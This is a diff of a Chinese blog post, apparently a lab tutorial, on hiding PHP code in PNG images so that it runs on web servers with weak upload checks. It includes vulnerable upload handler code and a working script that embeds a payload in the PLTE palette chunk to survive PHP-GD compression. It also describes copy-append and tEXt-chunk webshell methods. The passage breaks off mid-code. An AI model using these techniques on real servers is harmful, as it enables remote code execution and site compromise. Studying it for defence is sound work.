@@ -6,19 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://mrwq.github.io">
-  <title>Archives: 2022 | </title>
+  <title>在PNG中注入PHP代码 | </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="description">
-<meta property="og:type" content="website">
-<meta property="og:title">
-<meta property="og:url" content="https://mrwq.github.io/archives/2022/index.html">
+  <meta name="description" content="环境准备图片马想要执行需要的条件： 1.图片可以上传到目标服务器上。 2.图片可解析为PHP代码。 要满足第一个条件，可能的方式有文件上传、远程文件下载、SSRF等方式。 要满足第二个条件可能的方式有上传比如png格式木马但是可以改名为php，从而解析为php；或者可以修改.htacces文件来控制这个php解析类型，使其支持解析png为php代码执行；或者是只能上传png格式图片，但是可以文件包">
+<meta property="og:type" content="article">
+<meta property="og:title" content="在PNG中注入PHP代码">
+<meta property="og:url" content="https://mrwq.github.io/%E5%9C%A8PNG%E4%B8%AD%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="description">
+<meta property="og:description" content="环境准备图片马想要执行需要的条件： 1.图片可以上传到目标服务器上。 2.图片可解析为PHP代码。 要满足第一个条件，可能的方式有文件上传、远程文件下载、SSRF等方式。 要满足第二个条件可能的方式有上传比如png格式木马但是可以改名为php，从而解析为php；或者可以修改.htacces文件来控制这个php解析类型，使其支持解析png为php代码执行；或者是只能上传png格式图片，但是可以文件包">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633858.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633859.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633860.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633861.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633862.png">
+<meta property="og:image" content="https://www.idontplaydarts.com/images/flow1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633863.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633865.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633859.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633866.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633867.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633868.png">
+<meta property="article:published_time" content="2022-11-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-20T08:36:14.231Z">
 <meta property="article:author" content="ordar">
+<meta property="article:tag" content="bypass">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="PNG">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633858.png">
   
   
     <link rel="icon" href="/img/head.jpg">
@@ -235,41 +253,379 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-在PNG中注入PHP代码" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E5%9C%A8PNG%E4%B8%AD%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81/" class="archive-article-date">
-        <time datetime="2022-11-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-18</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/%E5%9C%A8PNG%E4%B8%AD%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81/">在PNG中注入PHP代码</a>
-	
+    <h1 class="article-title" itemprop="name">
+      在PNG中注入PHP代码
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/%E5%9C%A8PNG%E4%B8%AD%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81/" class="archive-article-date">
+        <time datetime="2022-11-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-18</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">3.9k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">16分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>图片马想要执行需要的条件：</p>
+<p>1.图片可以上传到目标服务器上。</p>
+<p>2.图片可解析为PHP代码。</p>
+<p>要满足第一个条件，可能的方式有文件上传、远程文件下载、SSRF等方式。</p>
+<p>要满足第二个条件可能的方式有上传比如png格式木马但是可以改名为php，从而解析为php；或者可以修改.htacces文件来控制这个php解析类型，使其支持解析png为php代码执行；或者是只能上传png格式图片，但是可以文件包含这个png来执行php代码。</p>
+<p>当然以上描述的情况这个跟目标环境有关系。为了方便测试，我制作了一个docker镜像。镜像中web服务支持文件上传，上传时会检查MIME类型是否为图片，但是不检查上传文件的扩展名。这表示可以上传一个图片格式的.php文件到服务器上。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull ordar/astrolock</span><br><span class="line">docker run -d -p 80:80 ordar/astrolock</span><br></pre></td></tr></table></figure>
+
+<h2 id="PNG结构"><a href="#PNG结构" class="headerlink" title="PNG结构"></a>PNG结构</h2><ul>
+<li>PNG的基本构成为：</li>
+</ul>
+<p><strong>8字节头文件+4字节数据长度+4字节数据标识符+数据块数据+4字节CRC校验码</strong></p>
+<p>PNG图片由很多数据块组成，每个数据块包含了不同的信息。PNG定义了两种类型的数据块：</p>
+<ul>
+<li>一种是称为关键数据块(critical chunk)，这是标准的数据块，每个PNG文件必须包含。</li>
+<li>另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。</li>
+</ul>
+<h3 id="关键数据块"><a href="#关键数据块" class="headerlink" title="关键数据块"></a>关键数据块</h3><p>关键数据块包括：<strong>文件头数据块</strong>、<strong>调色板数据块</strong>、<strong>图像数据块</strong>和<strong>图像结束数据块</strong></p>
+<p>“89 50 4E 47 00 DA 1A 0A” png文件的标识符</p>
+<p>文件头数据块IHDR</p>
+<p>调色板数据块PLTE</p>
+<p>图像数据块IDAT</p>
+<p>图像结束数据块IEND</p>
+<h3 id="辅助数据块"><a href="#辅助数据块" class="headerlink" title="辅助数据块"></a>辅助数据块</h3><p>其余 18 个块类型称为辅助块类型， 编码器可以生成哪些，解码器可以解释。</p>
+<p>透明度信息：tRNS<br>色彩空间信息：cHRM、gAMA、iCCP、sBIT、sRGB、cICP<br>文本信息：iTXt，tEXt，zTXt<br>杂项信息：bKGD、hIST、pHYs、sPLT、eXIf<br>时间信息：tIME<br>动画信息：acTL，fcTL，fdAT</p>
+<p>部分数据块如下：</p>
+<table>
+<thead>
+<tr>
+<th>数据块符号</th>
+<th>数据块名称</th>
+<th>多数据块</th>
+<th>可选否</th>
+<th>位置限制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>IHDR</strong></td>
+<td><strong>文件头数据块</strong></td>
+<td><strong>否</strong></td>
+<td><strong>否</strong></td>
+<td><strong>第一块</strong></td>
+</tr>
+<tr>
+<td>cHRM</td>
+<td>基色和白色点数据块</td>
+<td>否</td>
+<td>是</td>
+<td>在PLTE和IDAT之前</td>
+</tr>
+<tr>
+<td>gAMA</td>
+<td>图像γ数据块</td>
+<td>否</td>
+<td>是</td>
+<td>在PLTE和IDAT之前</td>
+</tr>
+<tr>
+<td>sBIT</td>
+<td>样本有效位数据块</td>
+<td>否</td>
+<td>是</td>
+<td>在PLTE和IDAT之前</td>
+</tr>
+<tr>
+<td><strong>PLTE</strong></td>
+<td><strong>调色板数据块</strong></td>
+<td><strong>否</strong></td>
+<td><strong>是</strong></td>
+<td><strong>在IDAT之前</strong></td>
+</tr>
+<tr>
+<td>bKGD</td>
+<td>背景颜色数据块</td>
+<td>否</td>
+<td>是</td>
+<td>在PLTE之后IDAT之前</td>
+</tr>
+<tr>
+<td>hIST</td>
+<td>图像直方图数据块</td>
+<td>否</td>
+<td>是</td>
+<td>在PLTE之后IDAT之前</td>
+</tr>
+<tr>
+<td>tRNS</td>
+<td>图像透明数据块</td>
+<td>否</td>
+<td>是</td>
+<td>在PLTE之后IDAT之前</td>
+</tr>
+<tr>
+<td>pHYs</td>
+<td>物理像素尺寸块</td>
+<td>否</td>
+<td>是</td>
+<td>在IDAT之前</td>
+</tr>
+<tr>
+<td><strong>IDAT</strong></td>
+<td><strong>图像数据块</strong></td>
+<td><strong>是</strong></td>
+<td><strong>否</strong></td>
+<td><strong>与其他IDAT连续</strong></td>
+</tr>
+<tr>
+<td>tIME</td>
+<td>图像最后修改时间数据块</td>
+<td>否</td>
+<td>是</td>
+<td>无限制</td>
+</tr>
+<tr>
+<td>tEXt</td>
+<td>文本信息数据块</td>
+<td>是</td>
+<td>是</td>
+<td>无限制</td>
+</tr>
+<tr>
+<td>zTXt</td>
+<td>压缩文本数据块</td>
+<td>是</td>
+<td>是</td>
+<td>无限制</td>
+</tr>
+<tr>
+<td><strong>IEND</strong></td>
+<td><strong>图像结束数据块</strong></td>
+<td><strong>否</strong></td>
+<td><strong>否</strong></td>
+<td><strong>最后一个数据块</strong></td>
+</tr>
+</tbody></table>
+<h2 id="在PNG中注入PHP代码"><a href="#在PNG中注入PHP代码" class="headerlink" title="在PNG中注入PHP代码"></a>在PNG中注入PHP代码</h2><h3 id="first-part-简单插入"><a href="#first-part-简单插入" class="headerlink" title="first-part 简单插入"></a>first-part 简单插入</h3><p>查看**&#x2F;first-part**的源代码，这非常简单：网络表单需要标题、描述和有效的PNG文件。然后，应用程序将从上传的图像文件中获取数据，从原始文件名构建一个唯一的文件名，并将文件简单地存储在文件系统中（suits_thumbnails目录中，可公开访问）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建“suit”对象并将其链接到Symfony表单</span></span><br><span class="line"><span class="variable">$suit</span> = <span class="keyword">new</span> <span class="title class_">Suit</span>();</span><br><span class="line"><span class="variable">$form</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createForm</span>(<span class="title class_">SuitType</span>::<span class="variable language_">class</span>, <span class="variable">$suit</span>);</span><br><span class="line"><span class="variable">$form</span>-&gt;<span class="title function_ invoke__">handleRequest</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isSubmitted</span>() &amp;&amp; <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取通过表单上传的文件，从原始文件名构建一个唯一的文件名</span></span><br><span class="line">    <span class="variable">$suitFile</span> = <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;suit&#x27;</span>)-&gt;<span class="title function_ invoke__">getData</span>();</span><br><span class="line">    <span class="variable">$originalFilename</span> = <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>();</span><br><span class="line">    <span class="variable">$newFilename</span> = <span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;_&#x27;</span>.<span class="variable">$originalFilename</span>;</span><br><span class="line">    <span class="comment"># 将上传的文件用唯一文件名存储在Web服务器上的缩略图目录/suits_thumbnails/中</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">move</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getParameter</span>(<span class="string">&#x27;thumbnails_directory&#x27;</span>),</span><br><span class="line">            <span class="variable">$newFilename</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$suit</span>-&gt;<span class="title function_ invoke__">setSuitFilename</span>(<span class="variable">$newFilename</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;File exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 将“suit”对象存储在数据库中以在应用程序中显示</span></span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">persist</span>(<span class="variable">$suit</span>);</span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirectToRoute</span>(<span class="string">&#x27;app_first_part&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法一-直接拼接"><a href="#方法一-直接拼接" class="headerlink" title="方法一 直接拼接"></a>方法一 直接拼接</h4><p>网上搜索图片马制作的方法，很容易就能找到的方法就是这种。以下方法的效果是等效的。</p>
+<p>1.文本方式打开图片，然后末尾粘贴一句话木马；</p>
+<p>2.cmd中 copy 1.png &#x2F;b + 2.php 3.png</p>
+<p>3.使用echo命令追加代码到png图片末尾</p>
+<p>这种方法已经烂大街了，这里就不多说了，懂得都懂。在png图像结束块IEND后面紧跟着phpinfo。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633858.png" alt="image-20221118172606263"></p>
+<h4 id="方法二-预定义文本块注入"><a href="#方法二-预定义文本块注入" class="headerlink" title="方法二 预定义文本块注入"></a>方法二 预定义文本块注入</h4><p>PNG 图像格式允许向文件添加注释以存储一些meta data数据。通过查阅PNG文档可以找到已经定义的文本块关键字。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633859.png" alt="image-20221117091517048"></p>
+<p>当然这些关键字是可以修改的，通过下载工具<a target="_blank" rel="noopener" href="https://exiftool.org/%E6%9D%A5%E8%AE%BE%E7%BD%AE%E8%BF%99%E4%BA%9B%E9%A2%84%E5%AE%9A%E4%B9%89%E5%85%B3%E9%94%AE%E5%AD%97%E3%80%82">https://exiftool.org/来设置这些预定义关键字。</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633860.png" alt="image-20221118105641287"></p>
+<p>当然它是可以成功解析的，可以看到文本块copyright后面紧接着就是phpinfo。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633861.png" alt="image-20221118105749538"></p>
+<h3 id="PHP-GD库的压缩图像"><a href="#PHP-GD库的压缩图像" class="headerlink" title="PHP-GD库的压缩图像"></a><strong>PHP-GD库的压缩图像</strong></h3><p>大多数时候，图像文件不会像&#x2F;first-part所假设的那样按原样存储在服务器上。而是使用一些标准的PHP 库（如 PHP-GD）将图像调整大小、压缩或编码为特定的文件格式。</p>
+<p>&#x2F;second-part 路径为攻击者实现了一个稍微更现实、也更困难的场景。在存储用户上传的文件之前，应用程序将使用 PHP-GD 函数 imagepng 压缩所有上传到 Web 服务器的图像。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建“suit”对象并将其链接到Symfony表单</span></span><br><span class="line"><span class="variable">$suit</span> = <span class="keyword">new</span> <span class="title class_">Suit</span>();</span><br><span class="line"><span class="variable">$form</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createForm</span>(<span class="title class_">SuitType</span>::<span class="variable language_">class</span>, <span class="variable">$suit</span>);</span><br><span class="line"><span class="variable">$form</span>-&gt;<span class="title function_ invoke__">handleRequest</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isSubmitted</span>() &amp;&amp; <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从表单中获取上传文件</span></span><br><span class="line">    <span class="variable">$suitFile</span> = <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;suit&#x27;</span>)-&gt;<span class="title function_ invoke__">getData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从原始文件名生成唯一的文件名</span></span><br><span class="line">    <span class="variable">$originalFilename</span> = <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>();</span><br><span class="line">    <span class="variable">$newFilename</span> = <span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;_&#x27;</span>.<span class="variable">$originalFilename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># 压缩上传的PNG（gzip库的第9级）并保存</span></span><br><span class="line">        <span class="variable">$source</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getPathName</span>());</span><br><span class="line">        <span class="title function_ invoke__">imagepng</span>(<span class="variable">$source</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getParameter</span>(<span class="string">&#x27;thumbnails_directory&#x27;</span>).<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newFilename</span>, <span class="number">9</span>);</span><br><span class="line">        <span class="variable">$suit</span>-&gt;<span class="title function_ invoke__">setSuitFilename</span>(<span class="variable">$newFilename</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Exception in image processing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 将“suit”对象存储在数据库中以在应用程序中显示</span></span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">persist</span>(<span class="variable">$suit</span>);</span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirectToRoute</span>(<span class="string">&#x27;app_second_part&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法三-PLTE块注入"><a href="#方法三-PLTE块注入" class="headerlink" title="方法三 PLTE块注入"></a>方法三 PLTE块注入</h4><p>压缩 PNG 文件时，PHP-GD将删除辅助块以减小输出文件的大小。这就是为什么我们在第一部分中注入的PHP payload无法在压缩过程中幸存下来。</p>
+<p>但是，如果我们可以将我们的payload注入到 PNG 文件的关键块中呢？当然，这些块在压缩图像时不会被破坏。执行这种注入的完美候选者是 PLTE 块，这是一个包含 PNG 图像的“调色板”的关键块，即颜色列表。根据 PNG 规范：</p>
+<p>PLTE 块包含 1 到 256 个调色板条目，每个条目都是三字节的形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Red:  1 byte (0 = black, 255 = red)</span><br><span class="line">Green: 1 byte (0 = black, 255 = green)</span><br><span class="line">Blue: 1 byte (0 = black, 255 = blue)</span><br></pre></td></tr></table></figure>
+
+<p>使用PLTE块，我们可能有256*3字节可用于将我们的payload注入到这样一个关键块中，这应该绰绰有余。唯一的限制是有效载荷的长度必须能被3整除。</p>
+<p>使用下面的脚本，可以轻松创建PLTE块注入payload的png图像。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$argv</span>) != <span class="number">3</span>) <span class="keyword">exit</span>(<span class="string">&quot;Usage <span class="subst">$argv</span>[0] &lt;PHP payload&gt; &lt;Output file&gt;&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="variable">$_payload</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$argv</span>[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_payload</span>) % <span class="number">3</span> != <span class="number">0</span>) &#123; <span class="variable">$_payload</span>.=<span class="string">&quot; &quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_pay_len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$_payload</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_pay_len</span> &gt; <span class="number">256</span>*<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;FATAL: The payload is too long. Exiting...&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_pay_len</span> %<span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;FATAL: The payload isn&#x27;t divisible by 3. Exiting...&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$width</span>=<span class="variable">$_pay_len</span>/<span class="number">3</span>;</span><br><span class="line"><span class="variable">$height</span>=<span class="number">20</span>;</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreate</span>(<span class="variable">$width</span>, <span class="variable">$height</span>);</span><br><span class="line">    </span><br><span class="line"><span class="variable">$_hex</span>=<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;H*&#x27;</span>,<span class="variable">$_payload</span>);</span><br><span class="line"><span class="variable">$_chunks</span>=<span class="title function_ invoke__">str_split</span>(<span class="variable">$_hex</span>[<span class="number">1</span>], <span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$_chunks</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$_color_chunks</span>=<span class="title function_ invoke__">str_split</span>(<span class="variable">$_chunks</span>[<span class="variable">$i</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$color</span>=<span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$im</span>,<span class="title function_ invoke__">hexdec</span>(<span class="variable">$_color_chunks</span>[<span class="number">0</span>]),<span class="title function_ invoke__">hexdec</span>(<span class="variable">$_color_chunks</span>[<span class="number">1</span>]),<span class="title function_ invoke__">hexdec</span>(<span class="variable">$_color_chunks</span>[<span class="number">2</span>]));</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$im</span>,<span class="variable">$i</span>,<span class="number">1</span>,<span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$output</span>);</span><br></pre></td></tr></table></figure>
+
+<p>执行脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php gen.php &#x27;&lt;?php phpinfo(); ?&gt;&#x27;  png-plte-inject.php</span><br></pre></td></tr></table></figure>
+
+<p>使用PLTE注入可以绕过PHP-GD库的压缩，可以成功上传并且成功解析。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633862.png" alt="image-20221118143204277"></p>
+<h3 id="PHP-GD库调整图像大小"><a href="#PHP-GD库调整图像大小" class="headerlink" title="PHP-GD库调整图像大小"></a>PHP-GD库调整图像大小</h3><p>Web 应用程序在处理图像时执行的另一个标准操作是调整它们的大小以标准化它们的格式。为此，应用程序可以例如使用PHP-GD库imagecopyresized函数或 imagecopyresampled函数。</p>
+<p>&#x2F;third-part路由实现了目标应用程序在存储输入PNG 文件之前对其进行压缩和调整大小的场景。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建“suit”对象并将其链接到Symfony表单</span></span><br><span class="line"><span class="variable">$suit</span> = <span class="keyword">new</span> <span class="title class_">Suit</span>();</span><br><span class="line"><span class="variable">$form</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createForm</span>(<span class="title class_">SuitType</span>::<span class="variable language_">class</span>, <span class="variable">$suit</span>);</span><br><span class="line"><span class="variable">$form</span>-&gt;<span class="title function_ invoke__">handleRequest</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isSubmitted</span>() &amp;&amp; <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从表单中获取上传文件</span></span><br><span class="line">    <span class="variable">$suitFile</span> = <span 